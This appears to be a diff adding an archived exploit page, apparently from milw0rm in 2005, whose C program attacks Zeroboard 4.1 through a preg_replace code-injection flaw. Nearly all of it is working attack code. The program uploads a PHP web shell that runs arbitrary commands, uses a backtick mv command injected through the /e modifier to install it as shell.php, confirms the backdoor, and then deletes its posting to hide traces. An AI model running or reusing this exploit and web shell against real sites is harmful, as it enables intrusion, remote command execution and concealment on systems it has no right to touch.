@@ -1,0 +1,667 @@
+<html><head><title>Zeroboard 4.1 preg_replace Remote nobody Shell Exploit</title></head><pre>/*
+*
+----------------------------------------------------------------------------------
+[+] Zeroboard preg_replace vulnerability Remote nobody shell exploit 
+----------------------------------------------------------------------------------
+
+&gt; by n0gada (n0gada@null2root.org)
+
+[*] date : 2005/5/29
+
+[*] the bug
+
+Original advisory: 
+- http://pandora.sapzil.info/text/notify/20050123.zb41advisory.php
+
+Application
+- Zeroboard 4.1 pl2 - 4.1 pl5
+
+Reference:
+- http://www.nzeo.com
+
+[*] Target - My test server
+
+$ ./zbexpl http://xxx.xxx.xxx/zboard/zboard.php?id=test
+- Target : http://xxx.xxx.xxx/zboard/zboard.php?id=test
+
+[+] xxx.xxx.xxx connecting ok!
+[+] Zeroboard writing . ok!
+[+] Confirmming your article - found!
+[+] Exploiting zeroboard start ............................... Done!
+[*] Confirmming your backdoor php script - 
+http://xxx.xxx.xxx/zboard/data/test/shell.php is generated!
+[+] Exploiting success!!
+[*] Remove your article - ok! :)
+
+------------------------------------------------------------------------------
+*
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdarg.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;time.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;sys/select.h&gt;
+#include &lt;errno.h&gt;
+
+
+#define BUFSIZE 4096
+#define READSIZE 1500
+
+void ParseZbHost(char *);
+void ConnectZboard(char *, unsigned short);
+void WriteZboard(void);
+void ExploitZboard(void);
+void ConfirmPHPScript(void);
+void DeleteArticle(void);
+void StatusProcess(void);
+void Usage(char *);
+void OutputErr(char *, int);
+
+char *zb_host;
+char *zb_dir;
+char *zb_tid;
+unsigned short zb_port;
+
+int sockfd = -1;
+int reconn=0;
+char ReadBuf[READSIZE];
+char WriteBuf[BUFSIZE];
+char TempBuf[BUFSIZ];
+char no[16];
+
+
+int main(int argc, char *argv[]){
+
+if(argc &lt; 2) Usage(argv[0]);
+
+if(argc &gt; 2) zb_port = atoi(argv[2]); 
+else zb_port = 80;
+
+// http://host/bbs/zboard.php?id=test 
+
+ParseZbHost(argv[1]);
+
+ConnectZboard(zb_host, zb_port);
+
+WriteZboard();
+
+ExploitZboard();
+
+ConfirmPHPScript();
+
+DeleteArticle();
+}
+
+void ParseZbHost(char *zbhost)
+{
+char *psbuf;
+char *sptr=NULL;
+char *eptr=NULL;
+
+psbuf = malloc(strlen(zbhost)+1);
+
+strcpy(psbuf, zbhost);
+
+if((sptr = strstr(psbuf,&quot;http://&quot;)) == NULL) OutputErr(&quot;http://host need\n&quot;, 0);
+
+zb_host = sptr+7;
+
+sptr = strchr(zb_host, '/');
+sptr[0] = '\0';
+sptr++;
+
+if((eptr = strstr(sptr, &quot;zboard.php?id=&quot;)) == NULL) OutputErr(&quot;\&quot;zboard.php?id=\&quot; 
+need\n&quot;, 0);
+
+zb_tid = eptr+14;
+
+eptr--;
+eptr[0] = '\0';
+
+zb_dir = sptr;
+
+fprintf(stdout, &quot; - Target : http://%s/%s/zboard.php?id=%s\n&quot;, zb_host, zb_dir, 
+zb_tid);
+fflush(stdout); 
+}
+
+
+void ConnectZboard(char *server, unsigned short port)
+{
+
+struct sockaddr_in serv; 
+struct hostent *hostname;
+
+if(!(hostname = gethostbyname(server))) OutputErr(server, 1);
+if((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) OutputErr(&quot;socket&quot;, 1);
+
+memset(&amp;serv, 0, sizeof(serv));
+serv.sin_family = AF_INET;
+serv.sin_port = htons(port);
+serv.sin_addr.s_addr = *((unsigned long *)hostname-&gt;h_addr_list[0]);
+// serv.sin_addr = *((struct in_addr *)hostname-&gt;h_addr_list[0]);
+
+if(connect(sockfd, (struct sockaddr *)&amp;serv, sizeof(struct sockaddr)) &lt; 0)
+OutputErr(&quot;connect&quot;, 1);
+
+if(!reconn) fprintf(stdout,&quot;\n [+] %s connecting ok!\n&quot;, server);
+else if(reconn == 1) fprintf(stdout, &quot; [+] %s reconnecting ok!\n&quot;, server);
+fflush(stdout);
+
+reconn = 0;
+}
+
+void WriteZboard(void)
+{
+fd_set fds;
+struct timeval tv;
+int err = -1;
+int i = 0;
+int cnt=0;
+char *tmp_ptr, *ptr;
+char form_data[BUFSIZE];
+
+memset(form_data, 0, sizeof(form_data));
+sprintf(form_data,
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;page\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;1\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;id\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;%s\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;no\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;select_arrange\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;headnum\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;desc\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;asc\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;page_num\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;keyword\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;category\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;sn\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;off\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;ss\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;on\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;sc\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;on\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;mode\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;write\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;password\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;1212\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;name\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;zero\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;email\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;zero@nzeo.com\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;homepage\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;subject\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;zero@nzeo.com hi~!\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;memo\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;`mv data/%s/d214924151d9e1ffac5bb2258561031e 
+data/%s/shell.php`;# 70ab423bfaea846c9db0b96126254103\r\n&quot;
+//&quot;-----------------------------8ac34985126d8\r\n&quot;
+//&quot;Content-Disposition: form-data; name=\&quot;sitelink1\&quot;\r\n&quot;
+//&quot;\r\n&quot;
+//&quot;\r\n&quot;
+//&quot;-----------------------------8ac34985126d8\r\n&quot;
+//&quot;Content-Disposition: form-data; name=\&quot;sitelink2\&quot;\r\n&quot;
+//&quot;\r\n&quot;
+//&quot;\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;file1\&quot;; 
+filename=\&quot;d214924151d9e1ffac5bb2258561031e\&quot;\r\n&quot;
+&quot;Content-Type: text/plain\r\n&quot;
+&quot;\r\n&quot;
+&quot;&lt;?
+if(count($_GET)) extract($_GET);
+if(count($_POST)) extract($_POST);
+if(count($_SERVER)) extract($_SERVER);
+echo \&quot;&lt;form action=$PHP_SELF method=post&gt;
+command : &lt;input type=text name=cmd&gt;
+&lt;input type=submit&gt;&lt;/form&gt;&lt;hr&gt;\&quot;;
+if($cmd){
+$cmd = str_replace(\&quot;\\\\\&quot;, \&quot;\&quot;, $cmd);
+echo \&quot;&lt;pre&gt;\&quot;; system($cmd); echo \&quot;&lt;/pre&gt;\&quot;;
+}
+?&gt;\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;file2\&quot;; filename=\&quot;\&quot;\r\n&quot;
+&quot;Content-Type: application/octet-stream\r\n&quot;
+&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;x\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;36\r\n&quot;
+&quot;-----------------------------8ac34985126d8\r\n&quot;
+&quot;Content-Disposition: form-data; name=\&quot;y\&quot;\r\n&quot;
+&quot;\r\n&quot;
+&quot;11\r\n&quot;
+&quot;-----------------------------8ac34985126d8--\r\n&quot;
+, zb_tid, zb_tid, zb_tid);
+
+
+
+memset(WriteBuf, 0, sizeof(WriteBuf));
+
+sprintf(WriteBuf,
+&quot;POST /%s/write_ok.php HTTP/1.1\r\n&quot;
+&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, 
+application/x-shockwave-flash, application/vnd.ms-excel, 
+application/vnd.ms-powerpoint, application/msword, */*\r\n&quot; 
+&quot;Referer: http://%s/%s/write.php?id=%s&amp;page=1&amp;sn1=&amp;divpage=1&amp;
+sn=off&amp;ss=on&amp;sc=on&amp;select_arrange=headnum&amp;desc=asc&amp;no=&amp;
+mode=write&amp;sn1=&amp;divpage=1\r\n&quot;
+&quot;Content-Type: multipart/form-data; boundary=---------------------------8ac34985126d8\r\n&quot;
+&quot;Accept-Encoding: gzip, deflate\r\n&quot;
+&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n&quot;
+&quot;Host: %s\r\n&quot;
+&quot;Content-Length: %d\r\n&quot;
+&quot;Connection: Keep-Alive\r\n&quot;
+&quot;Cache-Control: no-cache\r\n&quot; 
+&quot;\r\n&quot;&quot;%s&quot;, zb_dir, zb_host, zb_dir, zb_tid, zb_host, strlen(form_data), form_data);
+
+fprintf(stdout, &quot; [+] Zeroboard writing &quot;);
+fflush(stdout);
+
+if(write(sockfd, WriteBuf, strlen(WriteBuf)) &lt; 0) OutputErr(&quot;write&quot;, 1);
+
+tv.tv_sec = 60;
+tv.tv_usec = 0;
+
+FD_ZERO(&amp;fds);
+
+for(;;){
+
+memset(ReadBuf, 0, sizeof(ReadBuf));
+
+if(i!=0xb33f) StatusProcess();
+
+FD_SET(sockfd, &amp;fds);
+
+if(select(sockfd+1, &amp;fds, NULL, NULL, &amp;tv) &lt;= 0) OutputErr(&quot;select&quot;, 1);
+if(FD_ISSET(sockfd, &amp;fds)){
+
+if(read(sockfd, ReadBuf, sizeof(ReadBuf)) &lt;= 0) OutputErr(&quot;read&quot;, 1);
+
+
+if(strstr(ReadBuf, &quot;HTTP/1.1 &quot;)){
+if(strstr(ReadBuf+17, &quot;Connection: close\r\n&quot;)) reconn = 1;
+
+if(strstr(ReadBuf+9, &quot;200 OK\r\n&quot;)) { 
+err++;
+}
+else if(strstr(ReadBuf+9, &quot;404 Not Found\r\n&quot;)){
+OutputErr(&quot; failed!(page not found)\n&quot;, 0);
+}
+else if(strstr(ReadBuf+9, &quot;400 Bad Request\r\n&quot;)){
+OutputErr(&quot; failed!(Bad Request)\n&quot;, 0);
+}
+else {
+OutputErr(ReadBuf, 0);
+}
+
+}
+
+if(err == 0){
+
+if(strstr(ReadBuf,&quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;0; url=zboard.php?id=&quot;))
+{
+fprintf(stdout, &quot; ok!\n&quot;);
+fflush(stdout);
+
+fprintf(stdout,&quot; [+] Confirmming your article&quot;);
+fflush(stdout);
+
+if(tmp_ptr = strstr(ReadBuf+18, &quot;url=&quot;)) {
+
+ptr = tmp_ptr+4;
+if(ptr != NULL){
+if(tmp_ptr = strchr(ptr,'&quot;')) tmp_ptr[0] = '\0';
+}
+} 
+if(ptr = strstr(ReadBuf,&quot;=&amp;no=&quot;)){
+ptr += 5;
+memset(no, 0, sizeof(no));
+for(i=0; i&lt;16; i++){
+if(ptr[i] == '&amp;') break;
+no[i] = ptr[i];
+}
+}
+if(strlen(no) &gt; 0){
+fprintf(stdout,&quot; - found!\n&quot;);
+fflush(stdout);
+return;
+}
+else {
+OutputErr(&quot; - failed!(not writed!?!)\n&quot;, 0);
+}
+} 
+else {
+if(strstr(ReadBuf,&quot;Total Excuted Time :&quot;) &amp;&amp; strstr(ReadBuf,&quot;\x30\x0d\x0a\x0d\x0a&quot;)) break;
+}
+}
+else {
+OutputErr(&quot;err number error\n&quot;, 0);
+}
+}
+}
+
+fprintf(stderr, &quot; error!\n&quot;);
+
+}
+
+void ExploitZboard(void)
+{
+fd_set fds;
+struct timeval tv;
+int err = -1;
+
+if(reconn == 1) ConnectZboard(zb_host, zb_port);
+
+memset(WriteBuf, 0, sizeof(WriteBuf));
+
+sprintf(WriteBuf, 
+&quot;GET /%s/view.php?id=%s&amp;page=1&amp;sn1=&amp;divpage=1&amp;sn=off&amp;ss=off&amp;
+sc=on&amp;keyword=70ab423bfaea846c9db0b96126254103/e&quot;
+, zb_dir, zb_tid);
+
+memcpy(WriteBuf+strlen(WriteBuf), &quot;\x25\x30\x30&quot;, 3);
+
+sprintf(WriteBuf+strlen(WriteBuf),
+&quot;&amp;select_arrange=headnum&amp;desc=asc&amp;no=%s HTTP/1.1\r\n&quot;
+&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash,
+application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\r\n&quot;
+&quot;Referer: http://%s/%s/zboard.php\r\n&quot;
+&quot;Accept-Encoding: gzip, deflate\r\n&quot;
+&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n&quot;
+&quot;Host: %s\r\n&quot;
+&quot;Connection: Keep-Alive\r\n&quot;
+&quot;\r\n&quot;, no, zb_host, zb_dir, zb_host);
+
+fprintf(stdout, &quot; [+] Exploiting zeroboard start &quot;);
+fflush(stdout);
+
+if(write(sockfd, WriteBuf, strlen(WriteBuf)) &lt; 0) OutputErr(&quot;write&quot;, 1);
+
+tv.tv_sec = 60;
+tv.tv_usec = 0;
+
+FD_ZERO(&amp;fds);
+
+for(;;){
+
+StatusProcess();
+
+memset(ReadBuf, 0, sizeof(ReadBuf));
+
+FD_SET(sockfd, &amp;fds);
+if(select(sockfd+1, &amp;fds, NULL, NULL, &amp;tv) &lt;= 0) OutputErr(&quot;select&quot;, 1);
+if(FD_ISSET(sockfd, &amp;fds)){
+
+if(read(sockfd, ReadBuf, sizeof(ReadBuf)) &lt;= 0) OutputErr(&quot;read&quot;, 1);
+
+
+if(strstr(ReadBuf, &quot;HTTP/1.1 &quot;)){
+
+if(strstr(ReadBuf,&quot;Connection: close\r\n&quot;)) reconn = 1;
+
+if(strstr(ReadBuf+9, &quot;200 OK\r\n&quot;)) { 
+err++; 
+}
+else if(strstr(ReadBuf+9, &quot;404 Not Found\r\n&quot;)){
+OutputErr(&quot; failed!(page not found)\n&quot;, 0);
+}
+else if(strstr(ReadBuf+9, &quot;400 Bad Request\r\n&quot;)){
+OutputErr(&quot; failed!(Bad Request)\n&quot;, 0);
+}
+else {
+OutputErr(ReadBuf, 0);
+}
+
+}
+
+if(err &gt;= 0){
+
+if(strstr(ReadBuf,&quot;Total Excuted Time :&quot;) &amp;&amp; strstr(ReadBuf, &quot;\x30\x0d\x0a\x0d\x0a&quot;)){
+fprintf(stdout,&quot; Done!\n&quot;); 
+fflush(stdout);
+return;
+}
+
+}
+
+}
+}
+
+fprintf(stderr,&quot; error!\n&quot;); 
+
+}
+
+void ConfirmPHPScript(void)
+{
+fd_set fds;
+struct timeval tv;
+
+if(reconn == 1) ConnectZboard(zb_host, zb_port); 
+
+memset(WriteBuf, 0, sizeof(WriteBuf));
+sprintf(WriteBuf,
+&quot;GET /%s/data/%s/shell.php HTTP/1.1\r\n&quot;
+&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
+application/x-shockwave-flash, application/vnd.ms-excel,
+application/vnd.ms-powerpoint, application/msword, */*\r\n&quot;
+&quot;Referer: http://%s/%s/zboard.php\r\n&quot;
+&quot;Accept-Encoding: gzip, deflate\r\n&quot;
+&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n&quot;
+&quot;Host: %s\r\n&quot;
+&quot;Connection: Keep-Alive\r\n&quot;
+&quot;\r\n&quot;, zb_dir, zb_tid, zb_host, zb_dir, zb_host);
+
+fprintf(stdout, &quot; [*] Confirmming your backdoor php script&quot;);
+fflush(stdout);
+
+if(write(sockfd, WriteBuf, strlen(WriteBuf)) &lt; 0) OutputErr(&quot;write&quot;, 1);
+
+tv.tv_sec = 60;
+tv.tv_usec = 0;
+
+
+FD_ZERO(&amp;fds);
+
+for(;;){
+memset(ReadBuf, 0, sizeof(ReadBuf));
+
+FD_SET(sockfd, &amp;fds);
+if(select(sockfd+1, &amp;fds, NULL, NULL, &amp;tv) &lt;= 0) OutputErr(&quot;select&quot;, 1);
+if(FD_ISSET(sockfd, &amp;fds)){
+if(read(sockfd, ReadBuf, sizeof(ReadBuf)) &lt;= 0) OutputErr(&quot;read&quot;, 1);
+
+
+if(strstr(ReadBuf, &quot;HTTP/1.1 &quot;)){
+if(strstr(ReadBuf,&quot;Connection: close\r\n&quot;)) reconn = 1;
+
+if(strstr(ReadBuf+9, &quot;200 OK\r\n&quot;)) { 
+fprintf(stdout,&quot; - http://%s/%s/data/%s/shell.php is generated!\n 
+[+] Exploiting success!!\n&quot;, zb_host, zb_dir, zb_tid);
+fflush(stdout);
+return;
+}
+else if(strstr(ReadBuf+9, &quot;404 Not Found\r\n&quot;)){
+OutputErr(&quot; - page not found\n - 'mv' instruction permission denied.\n - zeroboard was patched.\n&quot;
+&quot; [-] Exploit failed!\n&quot;, 0);
+}
+else if(strstr(ReadBuf+9, &quot;400 Bad Request\r\n&quot;)){
+OutputErr(&quot; - Bad Request\n&quot;
+&quot; [-] Exploit failed!\n&quot;, 0);
+}
+else {
+OutputErr(ReadBuf, 0);
+}
+}
+
+
+}
+}
+
+fprintf(stderr,&quot; error!\n&quot;);
+}
+
+
+void DeleteArticle(void)
+{
+fd_set fds;
+struct timeval tv;
+char post_data[BUFSIZ];
+
+
+if(reconn == 1) ConnectZboard(zb_host, zb_port);
+
+sprintf(post_data,
+&quot;page=1&amp;id=%s&amp;no=%s&amp;select_arrange=headnum&amp;desc=asc&amp;page_num=20&amp;keyword=&amp;category=&amp;sn=off&amp;ss=off&amp;sc=on&amp;mode=&amp;c_no=&amp;password=1212&amp;x=20&amp;y=9\r\n&quot;, zb_tid, no);
+
+memset(WriteBuf, 0, sizeof(WriteBuf));
+sprintf(WriteBuf,
+&quot;POST /%s/delete_ok.php HTTP/1.1\r\n&quot;
+&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\r\n&quot;
+&quot;Referer: http://%s/%s/delete.php?id=%s&amp;page=1&amp;sn1=&amp;divpage=1&amp;sn=off&amp;ss=off&amp;sc=on&amp;select_arrange=headnum&amp;desc=asc&amp;no=%s\r\n&quot;
+&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;
+&quot;Accept-Encoding: gzip, deflate\r\n&quot;
+&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n&quot;
+&quot;Host: %s\r\n&quot;
+&quot;Content-Length: %d\r\n&quot;
+&quot;Connection: close\r\n&quot;
+&quot;Cache-Control: no-cache\r\n&quot;
+&quot;\r\n&quot;
+&quot;%s&quot;, zb_dir, zb_host, zb_dir, zb_tid, no, zb_host, strlen(post_data), post_data);
+
+
+fprintf(stdout, &quot; [*] Remove your article &quot;);
+fflush(stdout);
+
+if(write(sockfd, WriteBuf, strlen(WriteBuf)) &lt; 0) OutputErr(&quot;write&quot;, 1);
+
+tv.tv_sec = 60;
+tv.tv_usec = 0;
+
+FD_ZERO(&amp;fds);
+
+for(;;){
+
+memset(ReadBuf, 0, sizeof(ReadBuf));
+
+FD_SET(sockfd, &amp;fds);
+
+if(select(sockfd+1, &amp;fds, NULL, NULL, &amp;tv) &lt;= 0) OutputErr(&quot;select&quot;, 1);
+if(FD_ISSET(sockfd, &amp;fds)){
+if(read(sockfd, ReadBuf, sizeof(ReadBuf)) &lt;= 0) OutputErr(&quot;read&quot;, 1);
+
+if(strstr(ReadBuf, &quot;HTTP/1.1 &quot;)){
+if(strstr(ReadBuf+9, &quot;200 OK\r\n&quot;)) { 
+
+if(strstr(ReadBuf+17, &quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;0; url=zboard.php?id=&quot;)) {
+fprintf(stdout, &quot; - ok! :)\n&quot;);
+fflush(stdout);
+return;
+}
+else{ 
+break;
+}
+}
+else if(strstr(ReadBuf+9, &quot;404 Not Found\r\n&quot;)){
+OutputErr(&quot; - failed!(page not found)\n&quot;, 0);
+}
+else if(strstr(ReadBuf+9, &quot;400 Bad Request\r\n&quot;)){
+OutputErr(&quot; - failed!(Bad Request)\n&quot;, 0);
+}
+else {
+fprintf(stderr,&quot;%s&quot;, ReadBuf);
+exit(1);
+}
+}
+
+}
+}
+
+fprintf(stderr,&quot; error!\n&quot;);
+}
+
+void StatusProcess(void)
+{
+putchar('.');
+fflush(stdout);
+}
+
+
+void OutputErr(char *msg, int type)
+{
+if(!type){
+fprintf(stderr,&quot;%s&quot;, msg);
+fflush(stderr);
+}
+else if(type==1){
+if(!strcmp(msg, zb_host)) herror(msg);
+else perror(msg);
+}
+
+DeleteArticle();
+exit(1);
+}
+
+void Usage(char *arg)
+{ 
+fprintf(stderr,&quot;[*] Zeroboard preg_replace() vulnerability Remote nobody exploit by n0gada\n&quot;); 
+fprintf(stderr,&quot;--------------------------------------------------------------------------\n&quot;);
+fprintf(stderr,&quot;Usage: %s &lt;SERVER&gt; [PORT - default : 80] \n&quot;, arg);
+fprintf(stderr,&quot;--------------------------------------------------------------------------\n&quot;);
+
+exit(1);
+}
+
+// milw0rm.com [2005-05-31]</pre></html>
